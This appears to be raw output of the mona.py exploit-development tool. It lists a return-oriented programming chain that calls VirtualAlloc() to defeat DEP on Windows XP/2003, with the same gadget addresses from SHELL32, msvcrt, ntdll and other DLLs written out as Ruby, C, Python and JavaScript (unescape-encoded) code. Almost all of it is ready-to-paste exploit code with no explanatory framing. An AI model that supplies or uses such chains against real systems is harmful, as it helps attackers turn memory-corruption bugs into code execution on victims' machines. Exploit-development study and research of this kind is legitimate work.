 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      #[---INFO:gadgets_to_set_esi:---]
      0x7ca27291,  # POP ECX # RETN [SHELL32.dll] 
      0x77c1110c,  # ptr to &VirtualAlloc() [IAT msvcrt.dll]
      0x630102f0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [WININET.dll] 
      0x5ddf2985,  # XCHG EAX,ESI # RETN [iertutil.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x10208e1e,  # POP EBP # RETN [MSVCRTD.dll] 
      0x1a473720,  # & push esp # ret  [urlmon.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x7cb46174,  # POP EAX # RETN [SHELL32.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x76cab26d,  # NEG EAX # RETN [IMAGEHLP.dll] 
      0x775d72b7,  # XCHG EAX,EBX # RETN [ole32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7cb46174,  # POP EAX # RETN [SHELL32.dll] 
      0xa2f7ca75,  # put delta into eax (-> put 0x00001000 into edx)
      0x77c31556,  # ADD EAX,5D08458B # RETN [msvcrt.dll] 
      0x771213b4,  # XCHG EAX,EDX # RETN [OLEAUT32.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c4debf,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77e8d222,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c14001,  # XCHG EAX,ECX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c90277a,  # POP EDI # RETN [ntdll.dll] 
      0x7ca82224,  # RETN (ROP NOP) [SHELL32.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x77c4e0da,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x7719576d,  # PUSHAD # RETN [OLEAUT32.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      //[---INFO:gadgets_to_set_esi:---]
      0x7ca27291,  // POP ECX // RETN [SHELL32.dll] 
      0x77c1110c,  // ptr to &VirtualAlloc() [IAT msvcrt.dll]
      0x630102f0,  // MOV EAX,DWORD PTR DS:[ECX] // RETN [WININET.dll] 
      0x5ddf2985,  // XCHG EAX,ESI // RETN [iertutil.dll] 
      //[---INFO:gadgets_to_set_ebp:---]
      0x10208e1e,  // POP EBP // RETN [MSVCRTD.dll] 
      0x1a473720,  // & push esp // ret  [urlmon.dll]
      //[---INFO:gadgets_to_set_ebx:---]
      0x7cb46174,  // POP EAX // RETN [SHELL32.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x76cab26d,  // NEG EAX // RETN [IMAGEHLP.dll] 
      0x775d72b7,  // XCHG EAX,EBX // RETN [ole32.dll] 
      //[---INFO:gadgets_to_set_edx:---]
      0x7cb46174,  // POP EAX // RETN [SHELL32.dll] 
      0xa2f7ca75,  // put delta into eax (-> put 0x00001000 into edx)
      0x77c31556,  // ADD EAX,5D08458B // RETN [msvcrt.dll] 
      0x771213b4,  // XCHG EAX,EDX // RETN [OLEAUT32.dll] 
      //[---INFO:gadgets_to_set_ecx:---]
      0x77c4debf,  // POP EAX // RETN [msvcrt.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x77e8d222,  // NEG EAX // RETN [RPCRT4.dll] 
      0x77c14001,  // XCHG EAX,ECX // RETN [msvcrt.dll] 
      //[---INFO:gadgets_to_set_edi:---]
      0x7c90277a,  // POP EDI // RETN [ntdll.dll] 
      0x7ca82224,  // RETN (ROP NOP) [SHELL32.dll]
      //[---INFO:gadgets_to_set_eax:---]
      0x77c4e0da,  // POP EAX // RETN [msvcrt.dll] 
      0x90909090,  // nop
      //[---INFO:pushad:---]
      0x7719576d,  // PUSHAD // RETN [OLEAUT32.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x7ca27291,  # POP ECX # RETN [SHELL32.dll] 
      0x77c1110c,  # ptr to &VirtualAlloc() [IAT msvcrt.dll]
      0x630102f0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [WININET.dll] 
      0x5ddf2985,  # XCHG EAX,ESI # RETN [iertutil.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x10208e1e,  # POP EBP # RETN [MSVCRTD.dll] 
      0x1a473720,  # & push esp # ret  [urlmon.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x7cb46174,  # POP EAX # RETN [SHELL32.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x76cab26d,  # NEG EAX # RETN [IMAGEHLP.dll] 
      0x775d72b7,  # XCHG EAX,EBX # RETN [ole32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7cb46174,  # POP EAX # RETN [SHELL32.dll] 
      0xa2f7ca75,  # put delta into eax (-> put 0x00001000 into edx)
      0x77c31556,  # ADD EAX,5D08458B # RETN [msvcrt.dll] 
      0x771213b4,  # XCHG EAX,EDX # RETN [OLEAUT32.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c4debf,  # POP EAX # RETN [msvcrt.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x77e8d222,  # NEG EAX # RETN [RPCRT4.dll] 
      0x77c14001,  # XCHG EAX,ECX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c90277a,  # POP EDI # RETN [ntdll.dll] 
      0x7ca82224,  # RETN (ROP NOP) [SHELL32.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x77c4e0da,  # POP EAX # RETN [msvcrt.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x7719576d,  # PUSHAD # RETN [OLEAUT32.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "" + // #[---INFO:gadgets_to_set_esi:---] : 
    "%u7291%u7ca2" + // 0x7ca27291 : ,# POP ECX # RETN [SHELL32.dll] 
    "%u110c%u77c1" + // 0x77c1110c : ,# ptr to &VirtualAlloc() [IAT msvcrt.dll]
    "%u02f0%u6301" + // 0x630102f0 : ,# MOV EAX,DWORD PTR DS:[ECX] # RETN [WININET.dll] 
    "%u2985%u5ddf" + // 0x5ddf2985 : ,# XCHG EAX,ESI # RETN [iertutil.dll] 
    "" + // #[---INFO:gadgets_to_set_ebp:---] : 
    "%u8e1e%u1020" + // 0x10208e1e : ,# POP EBP # RETN [MSVCRTD.dll] 
    "%u3720%u1a47" + // 0x1a473720 : ,# & push esp # ret[urlmon.dll]
    "" + // #[---INFO:gadgets_to_set_ebx:---] : 
    "%u6174%u7cb4" + // 0x7cb46174 : ,# POP EAX # RETN [SHELL32.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%ub26d%u76ca" + // 0x76cab26d : ,# NEG EAX # RETN [IMAGEHLP.dll] 
    "%u72b7%u775d" + // 0x775d72b7 : ,# XCHG EAX,EBX # RETN [ole32.dll] 
    "" + // #[---INFO:gadgets_to_set_edx:---] : 
    "%u6174%u7cb4" + // 0x7cb46174 : ,# POP EAX # RETN [SHELL32.dll] 
    "%uca75%ua2f7" + // 0xa2f7ca75 : ,# put delta into eax (-> put 0x00001000 into edx)
    "%u1556%u77c3" + // 0x77c31556 : ,# ADD EAX,5D08458B # RETN [msvcrt.dll] 
    "%u13b4%u7712" + // 0x771213b4 : ,# XCHG EAX,EDX # RETN [OLEAUT32.dll] 
    "" + // #[---INFO:gadgets_to_set_ecx:---] : 
    "%udebf%u77c4" + // 0x77c4debf : ,# POP EAX # RETN [msvcrt.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%ud222%u77e8" + // 0x77e8d222 : ,# NEG EAX # RETN [RPCRT4.dll] 
    "%u4001%u77c1" + // 0x77c14001 : ,# XCHG EAX,ECX # RETN [msvcrt.dll] 
    "" + // #[---INFO:gadgets_to_set_edi:---] : 
    "%u277a%u7c90" + // 0x7c90277a : ,# POP EDI # RETN [ntdll.dll] 
    "%u2224%u7ca8" + // 0x7ca82224 : ,# RETN (ROP NOP) [SHELL32.dll]
    "" + // #[---INFO:gadgets_to_set_eax:---] : 
    "%ue0da%u77c4" + // 0x77c4e0da : ,# POP EAX # RETN [msvcrt.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "" + // #[---INFO:pushad:---] : 
    "%u576d%u7719" + // 0x7719576d : ,# PUSHAD # RETN [OLEAUT32.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

